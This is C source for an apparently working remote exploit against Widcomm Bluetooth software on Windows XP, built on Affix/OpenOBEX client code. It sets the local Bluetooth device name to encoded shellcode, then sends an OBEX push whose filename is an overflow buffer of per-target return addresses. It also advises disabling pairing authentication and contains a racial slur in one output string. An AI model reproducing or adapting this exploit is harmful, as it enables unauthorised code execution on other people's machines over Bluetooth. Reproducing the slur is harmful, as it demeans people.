/*
   http://www.digitalmunition.com
   Moded by KF (kf_lists[at]digitalmunition[dot]com) to exploit the Widcomm Overflows from PenTest. 
   http://www.pentest.co.uk/documents/ptl-2004-03.html

*/
/*
 * UNrooted.net example code
 *
 * Most of these functions are just rips from the Affix Bluetooth project OBEX
 * programs.  There are comments in the code about where the functions came
 * from and what if anything was changed.
 *
 * Throughout these functions I had to change the BTDEBUG and BTERROR macros to
 * printfs.  I could have just defined BTERROR and BTDEBUG, but I didn't for
 * some reason.. who knows.
 *
 * The original header comment specifying the copyright holder and the
 * requirements of the GPL are pasted below.
 */

/*
 * Original comment header block:
 * ----------------------------------------------------------------------
 *
 * Affix - Bluetooth Protocol Stack for Linux
 * Copyright (C) 2001 Nokia Corporation
 * Original Author: Dmitry Kasatkin <dmitry.kasatkin@nokia.com>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 *
 * $Id: obex_client.c,v 1.22 2002/06/25 10:16:49 kds Exp $
 *
 * OBEX client lib
 *
 * Fixes:	Dmitry Kasatkin <dmitry.kasatkin@nokia.com>
 *
 * Modified for BT name resolution and code cleanup: Davide Libenzi <davidel@xmailserver.org>
 *
 * ----------------------------------------------------------------------
 * End original comment block
 */

#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

#include <glib.h>

#include <openobex/obex.h>

#include "obex_socket.h"

#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define UPUSH_APPNAME "BluePIMped v0.1"
#define BT_SERVICE "OBEX"
#define OBEX_PUSH        5


/*
 * This struct came from the affix/include/affix/obex.h file, it holds all the
 * information for a client connection like what operation is currently being
 * carried out and the openobex connection handle.
 */

typedef struct client_context
{
	gboolean    serverdone;
	gboolean    clientdone;
	gchar       *get_name;  /* Name of last get-request */

	int     rsp;        /* error code */
	int     opcode;
	char        *arg;       /* response storage place */
	guint32     con_id;     /* connection ide */

	int     fd;
	gpointer    private;
} client_context_t;


/*
 * prototypes for local functions
 */

obex_t *__obex_connect(void *addr, int *err);
void obex_event(obex_t *handle, obex_object_t *object, gint mode, gint event,
		gint obex_cmd, gint obex_rsp);
int obex_disconnect(obex_t *handle);
guint8* easy_readfile(const char *filename, int *file_size);
gint get_filesize(const char *filename);
void request_done(obex_t *handle, obex_object_t *object, gint obex_cmd,
		  gint obex_rsp);


/*
 * These two functions are from affix/profiles/obex/obex_io.c
 */

gint get_filesize(const char *filename)
{
	struct stat stats;

	stat(filename, &stats);
	return (gint) stats.st_size;
}

guint8* easy_readfile(const char *filename, int *file_size)
{
	int actual;
	int fd;
	guint8 *buf;


	fd = open(filename, O_RDONLY, 0);
	if (fd == -1) {
		return NULL;
	}
	*file_size = get_filesize(filename);
	printf("name=%s, size=%d\n", filename, *file_size);
	if(! (buf = g_malloc(*file_size)) ) {
		return NULL;
	}

	actual = read(fd, buf, *file_size);
	close(fd);

	*file_size = actual;
	return buf;
}


/*
 * This function comes from affix/profiles/obex/obex_client.c .. All I changed
 * was a BTERROR() macro.  The OBEX_HandleInput() calls inside the loop should
 * result in request_done() getting called eventually.  request_done() sets
 * the clientdone flag which releases the function from its loop
 */

int handle_response(obex_t *handle, char *service)
{
	int         err = 0;
	client_context_t    *gt = OBEX_GetUserData(handle);

	gt->clientdone = FALSE;
	while(!gt->clientdone ) {
		if( (err = OBEX_HandleInput(handle, 1)) < 0) {
			printf("Error while doing OBEX_HandleInput()");
			break;
		}
		err = (gt->rsp == OBEX_RSP_SUCCESS)?0:gt->rsp;
	}
	return err;
}


/*
 * This function comes from affix/profiles/obex/obex_client.c ... I just
 * trimmed out handling of other transport styles.. that stuff was using some
 * globals and I didn't want to pull them in.
 */

int obex_disconnect(obex_t *handle)
{
	int         err;
	obex_object_t       *oo;    // OBEX Object
	client_context_t    *gt = OBEX_GetUserData(handle);

	oo = OBEX_ObjectNew(handle, OBEX_CMD_DISCONNECT);
	err = OBEX_Request(handle, oo);
	if( err )
		return err;
	handle_response(handle, BT_SERVICE);

	cobex_close(gt->private); //ctrans
	close(gt->fd);

	return 0;
}


/*
 * This function came from the affix/profiles/obex/obex_client.c file.
 * Initially it did some checks to see what type of link it was working over,
 * supporting a few different transports it looked like.  But the logic around
 * choosing what to do relied on a couple of global variables, so I just pulled
 * the decision paths I didn't want and left the ones I did.
 */

obex_t *__obex_connect(void *addr, int *err)
{
	obex_t			*handle;
	obex_object_t		*oo;	// OBEX Object
	client_context_t	*gt;
	obex_ctrans_t 		custfunc;


	gt = malloc(sizeof(client_context_t));
	if( gt == NULL )
		return NULL;

	memset(gt, 0, sizeof(client_context_t));

	gt->private = cobex_open(addr);
	if( gt->private == NULL ) {
		printf("cobex_open() failed");
		*err = -1;
		return NULL;
	}
	if(! (handle = OBEX_Init(OBEX_TRANS_CUST, obex_event, 0))) {
		printf( "OBEX_Init failed:%s", strerror(errno));
		close(gt->fd);
		*err = -1;
		return NULL;
	}

	custfunc.customdata = gt->private;
	custfunc.connect = cobex_connect;
	custfunc.disconnect = cobex_disconnect;
	custfunc.write = cobex_write;
	custfunc.handleinput = cobex_handle_input;
	custfunc.listen = cobex_connect;	// Listen and connect is 100% same on cable

	if(OBEX_RegisterCTransport(handle, &custfunc) < 0) {
		printf("Custom transport callback-registration failed");
		close(gt->fd);
		*err = -1;
		return NULL;
	}

	printf( "Registered transport\n" );


	OBEX_SetUserData(handle, gt);

	printf( "\nset user data\n" );
	// create new object
	oo = OBEX_ObjectNew(handle, OBEX_CMD_CONNECT);
	printf( "\ncreated new objext\n" );
	*err = OBEX_Request(handle, oo);
	printf( "\nstarted a new request\n" );
	if( *err )
		goto exit;
	*err = handle_response(handle, BT_SERVICE);
	printf("\nConnection return code: %d, id: %d\n", *err, gt->con_id);
	if( *err )
		goto exit;
	printf("Connection established\n");
	return handle;
	exit:
	obex_disconnect(handle);
	return NULL;
}


/*
 * These next two functions come from affix/profiles/obex/obex_client.c
 * All they do are set a few flags in the structs here or disconnect on error.
 * The obex_event() function is called by the obex library when it has an event
 * to deliver to us.. as simple as this is this means just setting that
 * clientdone flag in the user data struct.  Yea... really, that's it.
 */

void request_done(obex_t *handle, obex_object_t *object, gint obex_cmd,
                  gint obex_rsp)
{
	client_context_t *gt = OBEX_GetUserData(handle);

	printf("Command (%02x) has now finished, rsp: %02x", obex_cmd, obex_rsp);

	switch (obex_cmd) {
        case OBEX_CMD_DISCONNECT:
		printf("Disconnect done!");
		OBEX_TransportDisconnect(handle);
		gt->clientdone = TRUE;
		break;
        case OBEX_CMD_CONNECT:
		printf("Connected!\n");
		//connect_client(handle, object, obex_rsp);
		gt->clientdone = TRUE;
		break;
        case OBEX_CMD_GET:
		printf( "\n\n\n***warning, getclient commented out\n" );
		//get_client(handle, object, obex_rsp);
		gt->clientdone = TRUE;
		break;
        case OBEX_CMD_PUT:
		//put_client(handle, object, obex_rsp);
		gt->clientdone = TRUE;
		break;
        case OBEX_CMD_SETPATH:
		printf( "\n\n\n***warning, setpath_cleitn commented out\n" );
		//setpath_client(handle, object, obex_rsp);
		gt->clientdone = TRUE;
		break;

        default:
		printf("Command (%02x) has now finished", obex_cmd);
		break;
	}
}

void obex_event(obex_t *handle, obex_object_t *object, gint mode, gint event,
		gint obex_cmd, gint obex_rsp)
{
	switch (event)  {
        case OBEX_EV_PROGRESS:
		printf("Made some progress...\n");
		sleep(3);
		printf("Peace nigga...\n");
		exit(0);
		break;

        case OBEX_EV_ABORT:
		printf("Request aborted!\n");
		break;

        case OBEX_EV_REQDONE:
		printf("reqdone\n" );
		request_done(handle, object, obex_cmd, obex_rsp);
		// server_done(handle, object, obex_cmd, obex_rsp);
		break;

        case OBEX_EV_REQHINT:
		/* Accept any command. Not rellay good, but this is a test-program :
		 * ) */
		// OBEX_ObjectSetRsp(object, OBEX_RSP_CONTINUE, OBEX_RSP_SUCCESS);
		printf("setresp\n" );
		break;

        case OBEX_EV_REQ:
		//server_request(handle, object, event, obex_cmd);
		printf("server request\n" );
		break;

        case OBEX_EV_LINKERR:
		OBEX_TransportDisconnect(handle);
		printf("Link broken!\n");
		break;

        case OBEX_EV_PARSEERR:
		printf("Parse error!\n");
		break;

        default:
		printf("Unknown event %02x!\n", event);
		break;
	}
}


/*
 * This function also comes directly from affix/profiles/obex/obex_client.c
 * It calls __obex_connect() to connect to the device, and then uses the
 * OpenOBEX call interface to form a PUT request to send the file to the
 * device. Originally this used the basename() of path as the name to put as,
 * but I added a remote parameter so that I didn't have to rename files before
 * moving them over.  Essentially nothing is different.
 */

int obex_push(void *addr, char *path, char *remote)
{
	int         err;
	obex_object_t       *oo;    // OBEX Object
	obex_headerdata_t   hv;
	obex_t          *handle;
	guint8          *buf;
	int         file_size;
	gchar           *namebuf;
	int         name_len;
	char            *name, *pathc;
	client_context_t    *gt;

	pathc = strdup(path);
	name = remote;

	name_len = (strlen(name)+1)<<1;
	namebuf = name; // Thanks Mark! If you had not mentioned client side unicode i'd still be stuck messing with venetian shellcode. 

	buf = easy_readfile(path, &file_size);
	if(buf == NULL) {
		printf("Can't find file %s\n", name);
		return -ENOENT;
	}

	handle = __obex_connect(addr, &err);
	if( handle == NULL ) {
		printf("unable to connect to the server\n");
		g_free(buf);
		return err;
	}
	printf("connected to server\n");
	gt = OBEX_GetUserData(handle);
	gt->opcode = OBEX_PUSH;


	printf("Sending file: %s, path: %s, size: %d\n", name, path, file_size);
	oo = OBEX_ObjectNew(handle, OBEX_CMD_PUT);
	hv.bs = namebuf;
	OBEX_ObjectAddHeader(handle, oo, OBEX_HDR_NAME, hv, name_len, 0);
	hv.bq4 = file_size;
	OBEX_ObjectAddHeader(handle, oo, OBEX_HDR_LENGTH, hv, sizeof(guint32), 0);
	hv.bs = buf;
	OBEX_ObjectAddHeader(handle, oo, OBEX_HDR_BODY, hv, file_size, 0);

	err = OBEX_Request(handle, oo);
	if( err )
		return err;
	err = handle_response(handle, BT_SERVICE);

	obex_disconnect(handle);
	g_free(buf);
	free(pathc);

	return err;
}

static void set_device_name(int ctl, int hdev, char *opt)  // Johnh as usual... 
{
         int s = hci_open_dev(hdev);

         if (s < 0) {
                 fprintf(stderr, "Can't open device hci%d: %s (%d)\n",
                                                 hdev, strerror(errno), errno);
                 exit(1);
         }
         if (opt) {
                 if (hci_write_local_name(s, opt, 2000) < 0) {
                         fprintf(stderr, "Can't change local name on hci%d: %s (%d)\n",
                                                 hdev, strerror(errno), errno);
                         exit(1);
                 }
	}

}

/*
 * That's all there is to it.  With it all setup like this all I have to do
 * is call obex_push() to move a file.  Thank you Affix and OpenOBEX.  And of
 * course, Bluez.  Now I can show everyone I'm evil-l33t with a pretty GIR
 * background image on my phone.  PH33R!!!
 */

int main( int argc, char **argv )
{
/* 
	The following may be necessary in hcid.conf to prevent the pairing prompts.

       # Authentication and Encryption (Security Mode 3)
        auth disable;
        encrypt disable;
*/

	struct
	{
  		char *os;
  		u_long ret;
	}
 	targets[] =
 	{
  		{ "[ XP Pro SP0   - Ambicom btysb1.4.2w.zip 1.4.2 Build 10 ]", 0x01abf74e },
  		{ "[ XP Pro SP0   - Actiontec Bluetooth Software (ver 1.1 cd label) ]", 0x019bf74e },
  		{ "[ XP Pro SP0   - Belkin Bluetooth Software 1.4.2 Build 10 ]", 0x019bf74e },
  		{ "[ XP Pro SP1a  - Belkin Bluetooth Software 1.4.2 Build 10 ]", 0x0197f74e },
  		{ "[ XP Home SP1a (and Pro?) - Belkin Bluetooth Software 1.4.2 Build 10 ]", 0x0199f74e },
  		{ "[ Crash ]", 0x41424344 },
	}, v;

	if ( argc != 3 ) {
		printf("%s\nUsage: %s BTADDR@BTCHAN TARGET LFILE RFILE\n\n\tBTADDR@BTCHAN = BlueTooth address/name and OBEX channel\n\tTARGET 	= Target number\n",UPUSH_APPNAME,argv[0]);
		printf("Types:\n");
		int i;
  		for(i = 0; i < sizeof(targets)/sizeof(v); i++)
  		printf("%d [0x%.8x]: %s\n", i, targets[i].ret, targets[i].os);

		return( -1 );
	}

	/* http://www.edup.tudelft.nl/~bjwever/ - w32_popup_ExitThread.c */
	/* Size=224 Encoder=ShikataGaNai http://metasploit.com */
	/* CATS: ALL YOUR BLUETOOTH ARE BELONG TO US. */ 
	/* this still crashes the BTStackServer.exe... but oh well */
	unsigned char scode[] = 
	"\x2b\xc9\xda\xcd\xd9\x74\x24\xf4\x5f\xb1\x33\xb8\xd1\xf7\x19\xb7"
	"\x31\x47\x15\x83\xc7\x04\x03\x96\xe6\xfb\x42\xe4\x38\x3c\xc8\x9f"
	"\x7b\x8c\x9a\xdf\x77\x67\xec\xc3\x2a\xfc\x65\xf3\x5c\x6f\x1a\x03"
	"\x9d\x07\xd1\x31\xb3\xb3\x7d\x40\xb8\x5e\x0c\xfe\x85\xd0\x57\x16"
	"\x07\xfa\xce\xe6\xf8\xfb\x67\x09\x71\x3e\x46\x07\xd0\x29\xaf\xa7"
	"\xd5\xa9\xf3\xe6\x81\xfa\xc9\xe8\xc1\xd8\x2d\xe8\x11\x62\x62\xa4"
	"\x31\x3d\x35\x61\x60\x9d\x8b\xc5\xd1\x98\x5f\x9a\x96\x76\x28\x04"
	"\x68\x25\xed\x64\x28\x8c\xa1\x2b\xe2\x49\x1a\xe7\xb5\x75\x0f\x54"
	"\x64\x76\xfd\xe1\x9a\x7a\xc8\xef\xb3\x8c\xca\x0f\x44\xa2\x0a\x5f"
	"\xcd\x39\x31\x36\xd0\x83\x7c\x20\xea\x03\x81\xb0\xbd\x54\x0a\xf5"
	"\x7d\xd0\x58\xf0\x05\xe7\x8a\xa8\x7e\xb5\x6a\x4d\x6b\x0b\xab\x7c"
	"\xa2\x2d\xa0\x4a\xbe\xaf\x58\x83\x41\x6e\x6b\xf0\x11\x70\xb3\x73"
	"\xa9\x06\xcd\x42\xf5\x9c\xdb\xee\x82\x05\x38\x0f\x7e\xdf\xcb\x03"
	"\xcb\xab\x96\x07\xca\x40\xad\x33\x47\x97\x5a\x64\x09\x67\x7a\x9a";
	
	set_device_name(0,0,scode);
	//printf("RENAME DONE: SET NEW NAME TO %s\n",scode);
	//printf( "pushing file.\n");

	char buf[3000];
	memset(buf,'\0',sizeof(buf));
	memset(buf,'Z',3); // Sometimes u need 3 z's 

        int type = atoi(argv[2]);
        if(type)
        {
        	printf("[-] Selected target:\n");
              	printf("    %d [0x%.8x]: %s\n", type, targets[type].ret, targets[type].os);              
        }

	int x;
	for(x=0; x<=122; x=x+1)
	{
    		memcpy(buf+3+(x*4), (unsigned char *) &targets[type].ret, 4);
	}
	// Populate HKEY_LOCAL_MACHINE\SOFTWARE\Widcomm\BTConfig\Devices\<bdaddr>\Name with shellcode
	if ( obex_push( (void *)argv[1], "/etc/hosts", "YouAreBeingPwnedViaBlueTooth") != 0 ) {
		printf( "error\n" );
		return( -1 );
	}
	printf("\nsleeping 3 seconds before triggering the shellcode\n"); 
	sleep(3);
	if ( obex_push( (void *)argv[1], "/etc/hosts", buf ) != 0 ) {
		printf( "error\n" );
		return( -1 );
	}

	printf( "pushed!!\n" );
	return( 0 );
}

